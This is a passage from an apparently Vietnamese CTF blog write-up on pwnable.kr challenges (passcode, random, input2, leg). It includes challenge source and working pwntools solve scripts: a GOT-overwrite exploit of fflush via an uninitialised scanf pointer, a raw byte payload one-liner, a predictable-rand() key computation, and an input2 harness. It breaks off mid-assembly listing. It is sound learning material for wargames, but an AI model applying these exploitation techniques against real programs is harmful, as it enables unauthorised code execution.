<h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h2><p>Chạy chương trình và nhập vào biến thứ 2 thì gặp lỗi Segment fault nên phân tích code thì rõ là đoạn code đã code sai đoạn input <code>passcode1</code> và <code>passcode2</code> là thay vì truyền vào địa chỉ của 2 biến thì lại truyền vào giá trị, có nghĩa là khi chạy thì nó sẽ lấy giá trị nào nó trên thanh stack để nhập vào. Điều hay là chương trình vô tình nhập được vào <code>passcode1</code> (author setup :v). Việc nhập vào được vẫn là khả thi nếu như giá trị được trỏ tới là một địa chỉ hợp lệ (một địa chỉ đang tồn tại trong chương trình và có quyền ghi). Và khi debug sẽ thấy <code>passcode1</code> được nhận 1 địa chỉ hợp lệ, <code>passcode2</code> nhận một địa chỉ rác (nó là <code>canary</code> nhưng ta không cần quan tâm, sự xuất hiện của nó giúp mình nhìn thấy được các giá trị khác). Và khi debug hàm <code>welcome</code> sẽ thấy 2 giá trị này cũng tồn tại trên stack khi chương tình bảo nhập tên. Thực tế thì 2 giá trị đó đều là giá trị của thanh stack cũ. </p>
<p>Nhập  95 kí tự vào name và kiểm tra trạng  thái stack sẽ thấy được 1 địa chỉ hợp lệ và 1 giá trị hợp lệ khi gọi hàm <code>welcome</code> và nhập tên (ảnh 1)</p>
<p><img src="/img/post/writeup/pwnable-kr/series-1/1.png" alt="image.png"></p>
<pre><code>                     Trạng thái stack của hàm welcome khi nhập 95 kí tự
</code></pre>
<p>Khi đó debug cũng sẽ thấy các giá trị này được gọi tới như tham số thứ 2 của hàm <code>scanf</code> </p>
<p><img src="/img/post/writeup/pwnable-kr/series-1/2.png" alt="image.png"></p>
<pre><code>                    Các tham số được gọi khi gọi hàm scanf cho giá trị của passcode1
</code></pre>
<p><img src="/img/post/writeup/pwnable-kr/series-1/3.png" alt="image.png"></p>
<pre><code>                    Các tham số được gọi khi gọi hàm scanf cho giá trị của passcode2
</code></pre>
<p>Nhập tên dài hơn 4 kí tự sẽ khi đè địa chỉ đó, vậy có nghĩa là ta có thể điều khiển địa chỉ nhập vào của <code>passcode1</code>. Vì không có bảo vệ RELRO và địa chỉ PIE tĩnh nên ta sẽ tấn công địa chỉ GOT của 1 hàm nào sau đó khi nhập xong passcode1. Mình chọn hàm  <code>fflush</code> là mục tiêu vì là chọn hàm gần nhất thì giảm rủi ro chương trình bị lỗi.</p>
<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="meta"># usage: python3 solve.py passcode</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="title function_">len</span><span class="params">(sys.argv)</span> &lt;= <span class="number">2</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./&quot;</span> + sys.argv[<span class="number">1</span>])</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + sys.argv[<span class="number">1</span>], checksec=False)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    remote_addr = sys.argv[<span class="number">1</span>]</span><br><span class="line">    remote_port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    p = remote(remote_addr, <span class="type">int</span>(remote_port))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">fflush_got = <span class="number">0x0804c030</span></span><br><span class="line">login_168 = <span class="number">0x0804929e</span> <span class="meta">#win</span></span><br><span class="line">name = b<span class="string">&#x27;a&#x27;</span>*<span class="number">96</span> + p32(fflush_got)</span><br><span class="line"></span><br><span class="line">p.sendline(name)</span><br><span class="line">p.sendline(str(login_168))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>Đây là chương trình khai thác local và đã thành công. Riêng trên remote thì mình tà đạo 1 chút (vì nó lỗi hoài T~T ) </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import sys; sys.stdout.buffer.write(b&quot;\x41&quot;*96 + b&quot;\x14\xc0\x04\x08&quot; + b&quot;134517391&quot;)&#x27;</span> | ./passcode</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h1><h2 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Daddy, teach me how to use random value in programming!</span><br><span class="line"></span><br><span class="line">ssh random@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>

<h2 id="Source-4"><a href="#Source-4" class="headerlink" title="Source"></a>Source</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> random;</span><br><span class="line">	random = rand(); <span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((key ^ random) == <span class="number">0xcafebabe</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">		setregid(getegid(), getegid());</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h2><p>Với <code>rand()</code> mà không có seed truyền vào thì nó không thực sự random mà mình có thể biết được đầu ra bằng cách chạy 1 đoạn code với hàm <code>rand()</code> thì sẽ thu được giá trị giống như chương trình. Vậy thì chỉ cần viết lại 1 chương trình khác in ra hàm <code>rand()</code> 1 lần và lấy giá trị đó xor với <code>0xcafebabe</code> là sẽ thu được kết quả.</p>
<h2 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">p = ssh(</span><br><span class="line">    user=sys.argv[<span class="number">1</span>],</span><br><span class="line">    host=<span class="string">&#x27;pwnable.kr&#x27;</span>,</span><br><span class="line">    port=<span class="number">2222</span>,</span><br><span class="line">    password=<span class="string">&#x27;guest&#x27;</span>,</span><br><span class="line">)</span><br><span class="line">sh = p.shell()</span><br><span class="line">sh.recvuntil(f<span class="string">&#x27;&#123;sys.argv[1]&#125;@ubuntu:~$&#x27;</span>)</span><br><span class="line"></span><br><span class="line">first_time = <span class="number">1804289383</span></span><br><span class="line">key = f<span class="string">&#x27;&#123;first_time^0xcafebabe&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;./random&#x27;</span>)</span><br><span class="line">sh.sendline(key)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Input2"><a href="#Input2" class="headerlink" title="Input2"></a>Input2</h1><h2 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mom? how can I pass my input to a computer program?</span><br><span class="line"></span><br><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>

<h2 id="Source-5"><a href="#Source-5" class="headerlink" title="Source"></a>Source</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// argv</span></span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// stdio</span></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// env</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// file</span></span><br><span class="line">	FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// network</span></span><br><span class="line">	<span class="type">int</span> sd, cd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">	sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family = AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line">	<span class="keyword">if</span>(bind(sd, (<span class="keyword">struct</span> sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, <span class="number">1</span>);</span><br><span class="line">	<span class="type">int</span> c = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">	cd = accept(sd, (<span class="keyword">struct</span> sockaddr *)&amp;caddr, (<span class="type">socklen_t</span>*)&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// here&#x27;s your flag</span></span><br><span class="line">	setregid(getegid(), getegid());</span><br><span class="line">	system(<span class="string">&quot;/bin/cat flag&quot;</span>);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h2><p>Bài này hay ở chỗ nó dạy mình biết rằng các đầu vào của một chương trình có thể lấy như từ biến môi trường, file, stdin,… Cách giải thì chỉ cần research những đầu vào tương ứng như trong source là được. Ở đây mình cần dùng script để setup các tham số, các biến, và các pipline để bypass các stage.</p>
<p>Stage 1 : Argc là số lượng tham số bạn truyền vào, với tham số đầu tiên luôn là tên file. Tham số <code>argv</code> với <code>argv[’A’]</code> tương đương <code>argv[65]</code>. Được truyền vào như sau : <code>./file a b c</code>  với a b c là các tham số argv.</p>
<p>Stage 2 : với fd&#x3D;0 sẽ là stdin và fd&#x3D;2 là stderr, ở đây ta cần dùng script để tạo 1 luồng khác, gán stderr vào luồng đó và ghi vào đó giá trị tương ứng.</p>
<p>Stage 3 : Setup biến môi trường.</p>
<p>Stage 4 : Setup file. Bạn có thể tạo và file bằng python hoặc bằng bash script. </p>
<p>Stage 5 : Là stage dùng socket để gửi nhận giá trị, chỉ cần dùng pwntool để mở 1 luồng remote tới chương trình là ok. </p>
<h2 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">######### STAGE <span class="number">1</span> ########<span class="meta">#</span></span><br><span class="line"><span class="meta">argv = [<span class="string">&#x27;/home/input2/input2&#x27;</span>] + [<span class="string">&#x27;a&#x27;</span>]*99</span></span><br><span class="line">argv[ord(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">argv[ord(&#x27;</span>B<span class="string">&#x27;)] = &#x27;</span>\x20\x0a\x0d&#x27;</span><br><span class="line"></span><br><span class="line">argv[ord(<span class="string">&#x27;C&#x27;</span>)] = <span class="string">&#x27;4445&#x27;</span> <span class="meta"># for stage 5</span></span><br><span class="line"></span><br><span class="line">######### STAGE <span class="number">2</span> #########</span><br><span class="line">r1,w1 = os.pipe() <span class="meta"># tạo 1 pipe, câu lệnh trả về 2 biến read và write</span></span><br><span class="line">r2,w2 = os.pipe()</span><br><span class="line"></span><br><span class="line">os.write(w1,b<span class="string">&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">os.write(w2,b<span class="string">&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br><span class="line"><span class="meta"># cách 2 đó là dùng PTY</span></span><br><span class="line"></span><br><span class="line">######### STAGE <span class="number">3</span> ########<span class="meta">#</span></span><br><span class="line"><span class="meta">env = &#123;<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>: <span class="string">&#x27;\xca\xfe\xba\xbe&#x27;</span>&#125;</span></span><br><span class="line"></span><br><span class="line">######### STAGE <span class="number">4</span> ########<span class="meta">#</span></span><br><span class="line"><span class="meta">with open(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span></span><br><span class="line">    # Ghi dữ liệu vào tệp</span><br><span class="line">    f.write(b<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line"><span class="meta"># một cách khác đó là tạo 1 file bằng bash : touch $<span class="string">&#x27;\x0a&#x27;</span> và dùng công cụ như HxD thêm 4 byte \x00 vào file là được</span></span><br><span class="line"></span><br><span class="line">p = process(argv,<span class="built_in">stdin</span>=r1,<span class="built_in">stderr</span>=r2, env=env)</span><br><span class="line"></span><br><span class="line">######### STAGE <span class="number">5</span> ########<span class="meta">#</span></span><br><span class="line"><span class="meta">conn = remote(<span class="string">&#x27;localhost&#x27;</span>,4445)</span></span><br><span class="line">conn.sendline(b<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Leg"><a href="#Leg" class="headerlink" title="Leg"></a>Leg</h1><h2 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Daddy told me I should study ARM architecture.</span><br><span class="line">But I know Intel architecture and it should be similar.</span><br><span class="line">Why bother to study ARM?</span><br><span class="line"></span><br><span class="line">Download : http:<span class="comment">//pwnable.kr/bin/leg.c</span></span><br><span class="line">Download : http:<span class="comment">//pwnable.kr/bin/leg.asm</span></span><br><span class="line"></span><br><span class="line">ssh leg@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>

<h2 id="Source-6"><a href="#Source-6" class="headerlink" title="Source"></a>Source</h2><h3 id="leg-c"><a href="#leg-c" class="headerlink" title="leg.c"></a>leg.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov r3, pc\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">key2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;push	&#123;r6&#125;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;add	r6, pc, $1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;bx	r6\n&quot;</span></span><br><span class="line">        <span class="string">&quot;.code   16\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov	r3, pc\n&quot;</span></span><br><span class="line">        <span class="string">&quot;add	r3, $0x4\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push	&#123;r3&#125;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop	&#123;pc&#125;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;.code	32\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop	&#123;r6&#125;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">key3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov r3, lr\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Daddy has very strong arm! : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line">    <span class="keyword">if</span> ((key1() + key2() + key3()) == key)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratz!\n&quot;</span>);</span><br><span class="line">        <span class="type">int</span> fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="type">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">        write(<span class="number">0</span>, buf, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I have strong leg :P\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="leg-asm"><a href="#leg-asm" class="headerlink" title="leg.asm"></a>leg.asm</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 